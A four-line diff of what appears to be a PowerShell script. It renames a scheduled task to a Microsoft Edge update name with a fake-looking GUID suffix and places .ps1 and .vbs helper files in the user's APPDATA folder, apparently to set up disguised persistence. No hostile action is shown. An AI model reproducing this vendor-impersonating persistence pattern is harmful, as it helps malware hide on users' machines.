@@ -1,4 +1,4 @@
-$taskName = "MicrosoftEdgeUpdateChecker"
+$taskName = "MicrosoftEdgeUpdateChecker{C599C82-62E9-42CB-98E3-683A5482339}"
 $sessionUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $perCheck = Join-Path $env:APPDATA "perCheck.ps1"
 $perCheckVbs = Join-Path $env:APPDATA "perCheck.vbs"
